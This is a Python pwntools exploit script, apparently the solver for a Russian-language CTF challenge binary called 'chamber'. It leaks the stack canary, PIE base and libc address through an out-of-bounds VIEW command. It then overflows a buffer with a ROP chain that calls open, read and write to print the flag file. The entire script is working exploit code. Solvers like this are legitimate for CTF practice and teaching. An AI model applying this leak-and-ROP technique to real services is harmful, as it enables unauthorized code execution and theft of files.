#!/usr/bin/env python3
"""Прочитать стек за датчиками и выполнить ROP-цепочку open/read/write."""

import argparse
import re
from pathlib import Path

from pwn import ELF, ROP, context, p64, remote

ROOT = Path(__file__).resolve().parents[1]
LIBC_RETURN_DELTA = -0x36
VIEW_RETURN_OFFSET = 0x16ab


def view(tube, index):
    tube.sendlineafter("КОНТУР> ".encode(), f"VIEW {index}".encode())
    line = tube.recvline()
    match = re.search("КАНАЛ ".encode() + rb"\d+ = ([0-9a-f]{16})", line)
    if not match:
        raise RuntimeError(f"неожиданный ответ VIEW: {line!r}")
    return int(match.group(1), 16)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default="127.0.0.1")
    parser.add_argument("port", nargs="?", type=int, default=34120)
    args = parser.parse_args()

    context.arch = "amd64"
    context.log_level = "error"
    binary = ELF(str(ROOT / "public" / "chamber"), checksec=False)
    libc = ELF(str(ROOT / "public" / "libc.so.6"), checksec=False)
    tube = remote(args.host, args.port)

    canary = view(tube, 9)
    binary.address = view(tube, 11) - VIEW_RETURN_OFFSET
    libc_return = view(tube, 31)
    libc.address = libc_return - (libc.sym["__libc_start_main"] + LIBC_RETURN_DELTA)
    print(f"canary={canary:#x} pie={binary.address:#x} libc={libc.address:#x}")

    gadgets = ROP(libc)
    pop_rdi = gadgets.find_gadget(["pop rdi", "ret"]).address
    pop_rsi = gadgets.find_gadget(["pop rsi", "ret"]).address
    pop_rdx = gadgets.find_gadget(["pop rdx", "ret"]).address
    ret = gadgets.find_gadget(["ret"]).address
    scratch = binary.bss(0x100)

    chain = [
        ret,
        pop_rdi, binary.sym["flag_path"],
        pop_rsi, 0,
        pop_rdx, 0,
        libc.sym["open"],
        pop_rdi, 3,
        pop_rsi, scratch,
        pop_rdx, 0x100,
        libc.sym["read"],
        pop_rdi, 1,
        pop_rsi, scratch,
        pop_rdx, 0x100,
        libc.sym["write"],
    ]
    payload = b"A" * 104 + p64(canary) + p64(0) + b"".join(p64(x) for x in chain)
    tube.sendlineafter("КОНТУР> ".encode(), f"CAL {len(payload)}".encode())
    tube.sendafter("БАЙТЫ КАДРА:\n".encode(), payload)
    output = tube.recvall(timeout=4)
    match = re.search(rb"nskctf\{[^}\r\n]+\}", output)
    if not match:
        raise RuntimeError(f"флаг не найден в ответе: {output!r}")
    print(match.group().decode())
    for line in output.splitlines():
        if line.startswith("УЛИКА:".encode()):
            print(line.decode())


if __name__ == "__main__":
    main()
